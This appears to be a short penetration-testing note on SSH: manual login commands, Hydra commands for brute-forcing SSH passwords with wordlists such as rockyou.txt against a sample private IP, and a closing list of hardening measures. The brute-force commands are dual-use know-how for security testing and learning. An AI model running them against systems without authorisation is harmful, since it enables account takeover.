---
tags:
  - "#ssh"
  - "#hydra"
  - "#password-cracking"
---

---
## 1. Testing SSH Login

To manually attempt logging into an [[SSH]] server, use:

```bash
ssh <username>@<target-ip>
```

If a password is required, enter it manually. If you have a private key, specify it:

```bash
ssh -i <private-key> <username>@<target-ip>
```

If login is successful, the SSH server is accessible.

---

## 2. Brute-Forcing SSH Credentials with Hydra

Hydra can be used to test SSH login security by brute-forcing credentials.

### a) Brute-Forcing SSH with a Known Username

If a valid username is known, use:

```bash
hydra -l <username> -P <password-list.txt> ssh://<target-ip>
```

Example:

```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.100
```

### b) Brute-Forcing SSH Without Knowing the Username

If the username is unknown, use a list of possible usernames:

```bash
hydra -L <username-list.txt> -P <password-list.txt> ssh://<target-ip>
```

Example:

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
```

---

## 3. Preventing Unauthorized SSH Access

- **Disable root SSH login** (`PermitRootLogin no` in `sshd_config`).
- **Use key-based authentication** instead of passwords.
- **Change the default SSH port** to reduce automated attacks.
- **Restrict SSH access** to specific IPs using firewall rules.
- **Monitor SSH logs** for unauthorized access attempts.
